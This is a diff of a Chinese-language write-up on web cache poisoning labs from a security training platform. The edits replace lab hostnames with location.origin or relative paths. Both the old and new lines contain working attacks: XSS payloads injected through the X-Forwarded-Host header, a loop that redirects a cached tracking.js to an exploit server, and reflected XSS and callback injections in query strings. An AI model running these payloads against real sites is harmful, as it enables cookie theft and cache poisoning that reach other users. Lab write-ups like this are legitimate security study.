@@ -17,7 +17,7 @@ last_update:
 嘗試
 
 ```js
-fetch("https://0ac3001e047db9fd80a4039d000800c1.web-security-academy.net/", {
+fetch(location.origin, {
   headers: {
     "X-Forwarded-Host": "123",
   },
@@ -33,7 +33,7 @@ fetch("https://0ac3001e047db9fd80a4039d000800c1.web-security-academy.net/", {
 嘗試
 
 ```js
-fetch("https://0ac3001e047db9fd80a4039d000800c1.web-security-academy.net/", {
+fetch(location.origin, {
   headers: {
     "X-Forwarded-Host": `"></script><script>alert(document.cookie);const hello = "`,
   },
@@ -63,7 +63,7 @@ alert(document.cookie)
 之後觸發
 
 ```js
-fetch("https://0ac3001e047db9fd80a4039d000800c1.web-security-academy.net/", {
+fetch(location.origin, {
   headers: {
     "X-Forwarded-Host": `exploit-0a3100870464b98f8009020901be00c0.exploit-server.net`,
   },
@@ -133,7 +133,7 @@ alert(document.cookie)
 async function main() {
   while (true) {
     const response = await fetch(
-      "https://0aff00c704461d958030fe3700d30015.web-security-academy.net/resources/js/tracking.js",
+      `${location.origin}/resources/js/tracking.js`,
       {
         headers: {
           "X-Forwarded-Host":
@@ -148,7 +148,7 @@ async function main() {
 }
 ```
 
-成功導轉，代表我們成功讓 https://0aff00c704461d958030fe3700d30015.web-security-academy.net/resources/js/tracking.js 回應的 HTTP Response 變成 302 + `Location: https://exploit-0a5e005b04761d41802efd4a01b10044.exploit-server.net/resources/js/tracking.js`，如此變會載入惡意的程式碼，並且是在 Blog Post 網站執行程式碼，而不是在惡意網站執行程式碼
+成功導轉，代表我們成功讓 `/resources/js/tracking.js` 回應的 HTTP Response 變成 302 + `Location: https://exploit-0a5e005b04761d41802efd4a01b10044.exploit-server.net/resources/js/tracking.js`，如此變會載入惡意的程式碼，並且是在 Blog Post 網站執行程式碼，而不是在惡意網站執行程式碼
 
 ## Lab: Targeted web cache poisoning using an unknown header
 
@@ -473,7 +473,7 @@ initTranslations(
 
 確定可以執行 XSS
 
-查看切換語言，會訪問 https://0a1f00ac04542f65800362fe003f0006.web-security-academy.net/setlang/es
+查看切換語言，會訪問 `/setlang/es`
 
 然後回傳
 
@@ -499,7 +499,7 @@ set-cookie: lang=es; Path=/; Secure
 後來這題有請 AI 給提示，是要用 `X-Original-URL: /setlang\es` 的方式，完整 JS 是
 
 ```js
-fetch("https://0a71006c04f07f3780e1719800c30092.web-security-academy.net/", {
+fetch(location.origin, {
   credentials: "include",
   redirect: "manual",
   headers: {
@@ -514,16 +514,13 @@ fetch("https://0a71006c04f07f3780e1719800c30092.web-security-academy.net/", {
       ),
     ),
   );
-fetch(
-  "https://0a71006c04f07f3780e1719800c30092.web-security-academy.net/?localized=1",
-  {
-    credentials: "include",
-    headers: {
-      "X-Forwarded-Host":
-        "exploit-0aaf008d040f7fb780ac701c019e00e7.exploit-server.net",
-    },
+fetch(`${location.origin}/?localized=1`, {
+  credentials: "include",
+  headers: {
+    "X-Forwarded-Host":
+      "exploit-0aaf008d040f7fb780ac701c019e00e7.exploit-server.net",
   },
-)
+})
   .then((res) => res.text())
   .then((text) =>
     console.log(
@@ -620,7 +617,7 @@ x-cache-key: //$$
 ```js
 encodeURIComponent(`'/><script>alert(1)</script><link`);
 // %27%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Clink
-// https://0a4c0041048c4cc080dec1b6009700aa.web-security-academy.net/?a=%27%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Clink
+// /?a=%27%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Clink
 ```
 
 成功解題，這題根本就是 Reflected XSS，只是剛好也可以達成 Web Cache Poisoning，我一開始被題目綁住，思維跳不開來，沒有想到 Reflected XSS
@@ -634,7 +631,7 @@ encodeURIComponent(`'/><script>alert(1)</script><link`);
 
 這題跟上面一樣，改成用 `utm_content` 當作 query-string key 即可
 
-https://0a8200f503f6179780cf4e0400940019.web-security-academy.net/?utm_content=%27%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Clink
+`/?utm_content=%27%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Clink`
 
 ## Cache parameter cloaking
 
@@ -692,7 +689,7 @@ const setLangCookie = (lang) => {
 setCountryCookie({ country: "United Kingdom" });
 ```
 
-嘗試訪問 https://0a0d00c003cdbe5580ce0358006100cf.web-security-academy.net/js/geolocate.js?callback=alert(1)%3Bconsole.log
+嘗試訪問 `/js/geolocate.js?callback=alert(1)%3Bconsole.log`
 
 ```js
 const setCountryCookie = (country) => {
